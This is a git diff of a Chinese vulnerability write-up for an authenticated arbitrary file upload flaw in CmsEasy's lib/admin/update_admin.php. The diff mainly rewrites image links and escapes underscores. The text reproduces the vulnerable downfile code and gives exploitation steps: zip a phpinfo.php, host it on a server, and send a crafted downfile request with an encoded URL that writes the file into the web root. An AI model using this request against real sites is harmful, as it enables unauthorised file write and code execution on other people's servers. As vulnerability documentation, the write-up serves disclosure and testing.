@@ -1,4 +1,4 @@
-# CmsEasy update_admin.php 后台任意文件上传漏洞
+# CmsEasy update\_admin.php 后台任意文件上传漏洞
 
 ## 漏洞描述
 
@@ -18,11 +18,11 @@ body="cmseasyedit"
 
 ## 漏洞复现
 
-![image-20220518143113914](images/202205181436747.png)
+![image-20220518143113914](<../.gitbook/assets/202205181436747 (1).png>)
 
 存在漏洞的文件为 `lib/admin/update_admin.php`
 
-![image-20220518143714802](images/202205181437877.png)
+![image-20220518143714802](../.gitbook/assets/202205181437877.png)
 
 其中需要注意的代码为
 
@@ -89,7 +89,7 @@ function downfile_action()
     }
 ```
 
-其中使用 unlockString 和 get_file 方法
+其中使用 unlockString 和 get\_file 方法
 
 ```
 $url = front::get('url');
@@ -97,7 +97,7 @@ $url=service::getInstance()->unlockString($url,"cmseasy_url");
 $res = $this->get_file($url, 'cache');
 ```
 
-![image-20220518143733612](images/202205181437707.png)
+![image-20220518143733612](../.gitbook/assets/202205181437707.png)
 
 写入后在上层目录写入文件，即Web根目录，创建压缩包并上传可访问的服务器上
 
@@ -107,13 +107,12 @@ zip phpinfo.zip phpinfo.php
 
 构造下载请求
 
-![image-20220518143751402](images/202205181437504.png)
+![image-20220518143751402](../.gitbook/assets/202205181437504.png)
 
 ```
 /index.php?case=update&act=downfile&admin_dir=admin&site=default&url=buTdBnP8%3DJ%3DELYuF8Z2IwZyM-awr9fH%3D0cax6mxICukxw
 ```
 
-![image-20220518143812559](images/202205181438629.png)
+![image-20220518143812559](../.gitbook/assets/202205181438629.png)
 
-![image-20220518143830101](images/202205181438160.png)
-
+![image-20220518143830101](../.gitbook/assets/202205181438160.png)
